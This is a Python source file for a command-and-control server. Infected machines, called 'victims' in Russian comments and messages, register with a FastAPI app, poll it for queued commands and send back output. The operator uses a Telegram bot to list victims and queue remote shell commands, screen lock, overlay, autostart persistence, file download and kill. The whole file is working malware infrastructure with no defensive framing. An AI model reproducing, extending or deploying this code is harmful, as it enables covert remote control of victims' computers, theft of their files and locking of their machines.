# language: Python, file: main.py
from fastapi import FastAPI, Request, HTTPException
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, F
from aiogram.types import Update, Message
from aiogram.filters import Command
import os
import asyncio
import db

# ============================================================
# Конфиг из переменных окружения Render
# ============================================================
BOT_TOKEN   = os.getenv("BOT_TOKEN", "")
ADMIN_ID    = int(os.getenv("ADMIN_ID", "0"))
WEBHOOK_SEC = os.getenv("WEBHOOK_SECRET", "change_me")
PUBLIC_URL  = os.getenv("RENDER_EXTERNAL_URL", "").rstrip("/")

if not BOT_TOKEN or not ADMIN_ID:
    raise RuntimeError("BOT_TOKEN and ADMIN_ID must be set")

bot = Bot(BOT_TOKEN)
dp  = Dispatcher()

app = FastAPI()

# ============================================================
# МОДЕЛИ C2
# ============================================================
class RegisterReq(BaseModel):
    vid: str
    hostname: str = ""
    user: str = ""
    os: str = ""

class PollReq(BaseModel):
    vid: str

class ResultReq(BaseModel):
    vid: str
    output: str

# ============================================================
# C2 ЭНДПОИНТЫ
# ============================================================
@app.post("/register")
async def register(req: RegisterReq):
    db.register(req.vid, {"hostname": req.hostname, "user": req.user, "os": req.os})
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🟢 *Новая жертва*\n"
            f"`{req.vid}`\n"
            f"{req.user}@{req.hostname}\n"
            f"{req.os}",
            parse_mode="Markdown",
        )
    except Exception:
        pass
    return {"ok": True}

@app.post("/poll")
async def poll(req: PollReq):
    if req.vid not in db.victims:
        raise HTTPException(404, "unknown victim")
    db.touch(req.vid)
    cmds = db.pop_commands(req.vid)
    return {"commands": cmds}

@app.post("/result")
async def result(req: ResultReq):
    db.push_result(req.vid, req.output)
    try:
        await bot.send_message(
            ADMIN_ID,
            f"`{req.vid}`\n```\n{req.output[:3500]}\n```",
            parse_mode="Markdown",
        )
    except Exception:
        pass
    return {"ok": True}

# ============================================================
# TELEGRAM: проверка админа
# ============================================================
def is_admin(msg: Message) -> bool:
    return msg.from_user and msg.from_user.id == ADMIN_ID

# ============================================================
# КОМАНДЫ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(msg: Message):
    if not is_admin(msg): return
    await msg.answer(
        "C2 Bot\n\n"
        "/victims — список жертв\n"
        "/cmd <vid> <команда> — shell\n"
        "/result <vid> — последний вывод\n"
        "/lock <vid> — блокировка станции\n"
        "/overlay <vid> — показать оверлей\n"
        "/persist <vid> — автозапуск\n"
        "/download <vid> <путь> — скачать файл\n"
        "/kill <vid> — отключить"
    )

@dp.message(Command("victims"))
async def cmd_victims(msg: Message):
    if not is_admin(msg): return
    vs = db.list_victims()
    if not vs:
        await msg.answer("Нет жертв.")
        return
    lines = []
    for vid, info in vs:
        mark = "🟢" if db.is_online(vid) else "⚫"
        lines.append(f"{mark} `{vid}` — {info['info'].get('user','?')}@{info['info'].get('hostname','?')}")
    await msg.answer("\n".join(lines), parse_mode="Markdown")

@dp.message(Command("cmd"))
async def cmd_cmd(msg: Message):
    if not is_admin(msg): return
    parts = (msg.text or "").split(maxsplit=2)
    if len(parts) < 3:
        await msg.answer("Формат: /cmd <vid> <команда>")
        return
    vid, cmd = parts[1], parts[2]
    if db.enqueue(vid, f"shell {cmd}"):
        await msg.answer(f"[+] → `{vid}`: `{cmd}`", parse_mode="Markdown")
    else:
        await msg.answer("[-] Жертва не найдена.")

@dp.message(Command("result"))
async def cmd_result(msg: Message):
    if not is_admin(msg): return
    parts = (msg.text or "").split()
    if len(parts) < 2:
        await msg.answer("Формат: /result <vid>")
        return
    vid = parts[1]
    res = db.results.get(vid, [])
    if not res:
        await msg.answer("Пусто.")
        return
    await msg.answer(f"`{vid}`\n```\n{res[-1][:3500]}\n```", parse_mode="Markdown")

@dp.message(Command("lock"))
async def cmd_lock(msg: Message):
    if not is_admin(msg): return
    parts = (msg.text or "").split()
    if len(parts) < 2:
        await msg.answer("Формат: /lock <vid>")
        return
    db.enqueue(parts[1], "lock")
    await msg.answer(f"[+] Lock → {parts[1]}")

@dp.message(Command("overlay"))
async def cmd_overlay(msg: Message):
    if not is_admin(msg): return
    parts = (msg.text or "").split()
    if len(parts) < 2:
        await msg.answer("Формат: /overlay <vid>")
        return
    db.enqueue(parts[1], "overlay")
    await msg.answer(f"[+] Overlay → {parts[1]}")

@dp.message(Command("persist"))
async def cmd_persist(msg: Message):
    if not is_admin(msg): return
    parts = (msg.text or "").split()
    if len(parts) < 2:
        await msg.answer("Формат: /persist <vid>")
        return
    db.enqueue(parts[1], "persist")
    await msg.answer(f"[+] Persist → {parts[1]}")

@dp.message(Command("download"))
async def cmd_download(msg: Message):
    if not is_admin(msg): return
    parts = (msg.text or "").split(maxsplit=2)
    if len(parts) < 3:
        await msg.answer("Формат: /download <vid> <путь>")
        return
    db.enqueue(parts[1], f"download {parts[2]}")
    await msg.answer(f"[+] Download → {parts[1]}: {parts[2]}")

@dp.message(Command("kill"))
async def cmd_kill(msg: Message):
    if not is_admin(msg): return
    parts = (msg.text or "").split()
    if len(parts) < 2:
        await msg.answer("Формат: /kill <vid>")
        return
    db.enqueue(parts[1], "exit")
    await msg.answer(f"[+] Kill → {parts[1]}")

# ============================================================
# TELEGRAM WEBHOOK
# ============================================================
@app.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if secret != WEBHOOK_SEC:
        raise HTTPException(401, "bad secret")
    data = await request.json()
    update = Update.model_validate(data, context={"bot": bot})
    await dp.feed_update(bot, update)
    return {"ok": True}

# ============================================================
# СТАРТ: регистрируем вебхук
# ============================================================
@app.on_event("startup")
async def on_startup():
    if PUBLIC_URL:
        webhook_url = f"{PUBLIC_URL}/telegram/webhook"
        await bot.set_webhook(
            webhook_url,
            secret_token=WEBHOOK_SEC,
            drop_pending_updates=True,
        )
        print(f"[+] webhook set: {webhook_url}")
    else:
        print("[!] RENDER_EXTERNAL_URL not set — webhook skipped")

@app.on_event("shutdown")
async def on_shutdown():
    await bot.session.close()

# ============================================================
# Healthcheck (Render его дёргает)
# ============================================================
@app.get("/")
async def root():
    return {"ok": True, "service": "c2bot"}
